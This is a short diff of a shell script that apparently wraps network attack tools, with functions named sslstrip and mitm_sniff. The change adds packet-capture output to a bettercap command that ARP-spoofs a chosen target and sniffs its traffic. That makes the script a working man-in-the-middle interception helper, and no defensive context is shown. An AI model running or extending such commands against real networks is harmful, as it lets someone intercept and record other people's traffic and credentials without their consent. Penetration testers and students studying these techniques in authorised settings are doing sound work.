@@ -32,7 +32,7 @@ sslstrip() {
 }
 
 mitm_sniff() {
-    sudo bettercap -I ${INTERFACE} ${TARGET} --spoofer ARP -X | tee -a bettercap.log
+    sudo bettercap -I ${INTERFACE} ${TARGET} --spoofer ARP -X --sniffer-output capture.pcap | tee -a bettercap.log
 }
 
 user_input() {
